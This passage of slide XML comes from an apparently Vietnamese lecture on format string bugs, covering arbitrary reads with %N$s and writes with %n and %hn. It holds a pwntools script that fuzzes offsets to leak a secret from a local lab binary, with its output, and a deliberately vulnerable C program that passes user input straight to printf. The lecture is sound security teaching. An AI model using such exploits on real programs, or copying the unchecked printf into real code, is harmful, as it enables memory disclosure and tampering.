              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Vậy làm sao đưa địa chỉ cần ghi vào stack ?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>→ Chính cái input (fmt[])  ĐÃ nằm sẵn trên stack rồi !</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>→ Ghi thẳng địa chỉ của biến cần đọc vào fmt[] </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>Để request được đúng tới argumnet đó thì ta có thể liên tục call %s,%s,%s cho tới khi lấy được args là fmt [] hoặc có thể dùng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>positional argument %N$s</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>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2" name="TextBox 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="5429880" cy="5468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Calibri"/>
              </a:rPr>
              <a:t>READ — leak value địa chỉ bất kỳ </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="173" name="TextBox 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="460080" y="746280"/>
            <a:ext cx="10969200" cy="4510800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="174" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="360" y="1607400"/>
            <a:ext cx="12187800" cy="2963880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>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5" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10968120" cy="8182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Calibri"/>
              </a:rPr>
              <a:t>READ — exploit : fuzz %N$s</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="176" name="TextBox 140"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="914400"/>
            <a:ext cx="10968480" cy="5695920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="99"/>
              </a:spcAft>
            </a:pP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from pwn import *</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="99"/>
              </a:spcAft>
            </a:pP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secret = b'SECRET_LEAKME_1337'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="99"/>
              </a:spcAft>
            </a:pP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for n in range(1, 40):</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q = process('./fmt_read')</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line = q.recvline().decode().strip()</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leakme_addr = int(line.split('@')[1].strip(), 16)</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fmt_part = f'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FF6D6D"/>
                </a:highlight>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>%{n}$s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>'.encode().ljust(7, b'A')  # Align stack </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="99"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="C9211E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>    payload = fmt_part + b'\x00' + p64(leakme_addr) # Đặt địa chỉ vào input  </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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q.sendline(payload)</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out = q.recvall(timeout=1)</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q.close()</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if secret in out:</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print(payload)</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print(f'[+] found at offset {n}: {out}')</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break</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else:</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00000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>    print('[-] not found')</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B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>$ python3 ex_read.py</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="99"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>[+]b'%7$sAAA\x0000@\x00\x00\x00\x00\x00'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="99"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>[+] found at offset 7: b'leakme @ 0x403030\nEnter format: SECRET_LEAKME_1337AAA'</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7" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="6468120" cy="5468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Calibri"/>
              </a:rPr>
              <a:t>WRITE — ghi đè value của địa chỉ bất kỳ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="178" name="TextBox 143"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="687960" y="914400"/>
            <a:ext cx="10968480" cy="56516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fmt.c</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#include &lt;stdio.h&gt;</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#include &lt;string.h&gt;</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int main(void) {</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char fmt[100];</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int money = 0;</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printf("money @ %p = 0x%x\n", (void*)&amp;money, money);</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printf("Enter format: ");</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if (fgets(fmt, sizeof(fmt), stdin) == NULL)</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return 1;</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size_t len = strlen(fmt);</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if (len &gt; 0 &amp;&amp; fmt[len - 1] == '\n')</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fmt[len - 1] = '\0';</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printf(fmt);</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printf("\n");</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if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="069A2E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>money == 0xDEADBEEF</a:t>
            </a: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Consolas"/>
              </a:rPr>
              <a:t>        printf("FLAG{money_set}\n");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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 else {</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printf("money = 0x%x (not DEADBEEF)\n", money);</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    return 0;</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nsolas"/>
              </a:rPr>
              <a:t>}</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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="179" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="3429000"/>
            <a:ext cx="3884040" cy="7297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100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Vậy làm sao dùng bug format string để ghi đè giá trị money ? </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="180" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7104960" y="4114800"/>
            <a:ext cx="2953080" cy="2285640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>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1" name="TextBox 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="6468120" cy="5468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Calibri"/>
              </a:rPr>
              <a:t>WRITE — ghi đè value của địa chỉ bất kỳ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="182" name="TextBox 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1595880"/>
            <a:ext cx="7131960" cy="3432960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Làm sao để write địa chỉ bất kỳ ?  Tương tự cách read địa chỉ bất kỳ , ta cũng đưa địa chỉ cần ghi vào trong fmt[] trên stack . Nhưng còn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>một vấn đề </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Vì %n ghi số ký tự đã in ra, nên để ghi giá trị </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="BF0041"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>0xDEADBEEF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>, ta phải in ra một số lượng ký tự rất lớn (khoảng 3,7 tỷ ký tự) ,và sẽ dẫn đến crash. Lúc này nhìn vào mọi feature đã học đựoc ở trên ta có thể dùng tới </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="069A2E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Size Modifer </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="183" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7543800" y="554400"/>
            <a:ext cx="4343040" cy="5846040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>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4" name="TextBox 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="367560"/>
            <a:ext cx="3488400" cy="5468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Calibri"/>
              </a:rPr>
              <a:t>%hn solves the game</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="185" name="TextBox 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1085400"/>
            <a:ext cx="10969200" cy="4307760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> .</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rPr>
              <a:t>          Address                     Memory</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rPr>
              <a:t>     ┌────────────────────┬──────────────────┐</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rPr>
              <a:t>     │ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00A933"/>
                </a:highlight>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>0x7ffed7f0162c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>      │       EF         │ ← byte 0</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rPr>
              <a:t>     ├────────────────────┼──────────────────┤</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rPr>
              <a:t>     │ 0x7ffed7f0162d      │       BE         │ ← byte 1</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rPr>
              <a:t>     ├────────────────────┼──────────────────┤</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rPr>
              <a:t>     │ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00A933"/>
                </a:highlight>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>0x7ffed7f0162e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>      │       AD         │ ← byte 2</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rPr>
              <a:t>     ├────────────────────┼──────────────────┤</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rPr>
              <a:t>     │ 0x7ffed7f0162f      │       DE         │ ← byte 3</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rPr>
              <a:t>     └────────────────────┴──────────────────┘</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>%hn chỉ ghi 2 byte nên tối đa chỉ cần 65535 bytes in ra cho mỗi 2 byte.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
